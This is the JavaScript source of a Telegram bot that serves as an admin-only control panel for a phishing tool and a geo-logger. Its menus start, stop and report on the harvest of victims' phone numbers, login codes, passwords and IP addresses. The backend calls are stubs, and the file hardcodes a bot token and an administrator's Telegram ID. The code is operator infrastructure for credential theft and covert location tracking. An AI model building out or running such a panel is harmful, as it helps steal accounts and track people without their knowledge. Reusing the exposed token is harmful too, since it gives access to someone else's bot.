const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');

const BOT_TOKEN = '8273534923:AAHw0kp1NnDbQna8ZQg-4Dji0UZEqFrCXhE';
const ADMIN_ID = 6307490597; // твой Telegram ID

const bot = new Telegraf(BOT_TOKEN);

// Проверка, что команды выполняет только админ
bot.use((ctx, next) => {
  if (ctx.from.id !== ADMIN_ID) return ctx.reply('❌ Доступ запрещён');
  return next();
});

// Главное меню с кнопками
const mainMenu = Markup.inlineKeyboard([
  [Markup.button.callback('📊 Фишер', 'menu_fisher')],
  [Markup.button.callback('📍 Гео-логгер', 'menu_geo')],
  [Markup.button.callback('📈 Собрать данные', 'collect_data')],
  [Markup.button.callback('🔄 Обновить', 'refresh')]
]);

// Меню фишера
const fisherMenu = Markup.inlineKeyboard([
  [Markup.button.callback('▶️ Запустить', 'fisher_start')],
  [Markup.button.callback('⏹️ Остановить', 'fisher_stop')],
  [Markup.button.callback('📊 Статус', 'fisher_status')],
  [Markup.button.callback('🔙 Назад', 'back')]
]);

// Меню гео-логгера
const geoMenu = Markup.inlineKeyboard([
  [Markup.button.callback('▶️ Запустить', 'geo_start')],
  [Markup.button.callback('⏹️ Остановить', 'geo_stop')],
  [Markup.button.callback('📊 Статус', 'geo_status')],
  [Markup.button.callback('🔙 Назад', 'back')]
]);

// Стартовая команда (только для админа)
bot.start((ctx) => {
  ctx.reply('🎮 Панель управления', mainMenu);
});

// Обработка кнопок
bot.action('menu_fisher', (ctx) => {
  ctx.editMessageText('📊 Управление фишером', fisherMenu);
});

bot.action('menu_geo', (ctx) => {
  ctx.editMessageText('📍 Управление гео-логгером', geoMenu);
});

bot.action('back', (ctx) => {
  ctx.editMessageText('🎮 Панель управления', mainMenu);
});

bot.action('refresh', (ctx) => {
  ctx.answerCbQuery('Меню обновлено');
  ctx.editMessageText('🎮 Панель управления', mainMenu);
});

// Команды фишера
bot.action('fisher_start', async (ctx) => {
  await ctx.answerCbQuery('Запуск...');
  // Здесь будет API запрос к Railway для запуска проекта
  ctx.editMessageText('✅ Фишер запущен', fisherMenu);
});

bot.action('fisher_stop', async (ctx) => {
  await ctx.answerCbQuery('Остановка...');
  // API запрос на остановку
  ctx.editMessageText('⏹️ Фишер остановлен', fisherMenu);
});

bot.action('fisher_status', async (ctx) => {
  await ctx.answerCbQuery();
  // Запрос статуса
  ctx.editMessageText('📊 Фишер: работает\n📥 Собрано данных: 0', fisherMenu);
});

// Команды гео-логгера
bot.action('geo_start', async (ctx) => {
  await ctx.answerCbQuery('Запуск...');
  ctx.editMessageText('✅ Гео-логгер запущен', geoMenu);
});

bot.action('geo_stop', async (ctx) => {
  await ctx.answerCbQuery('Остановка...');
  ctx.editMessageText('⏹️ Гео-логгер остановлен', geoMenu);
});

bot.action('geo_status', async (ctx) => {
  await ctx.answerCbQuery();
  ctx.editMessageText('📍 Гео-логгер: работает\n🌍 Последний IP: 185.143.xxx.xx', geoMenu);
});

// Сбор данных с инструментов
bot.action('collect_data', async (ctx) => {
  await ctx.answerCbQuery('Собираю данные...');
  const data = `📊 Статистика:

🔐 Фишер:
- Номеров: 0
- Кодов: 0
- Паролей: 0

📍 Гео-логгер:
- Визитов: 0
- Последний: —`;
  
  ctx.editMessageText(data, mainMenu);
});

bot.launch();
console.log('Control bot started');
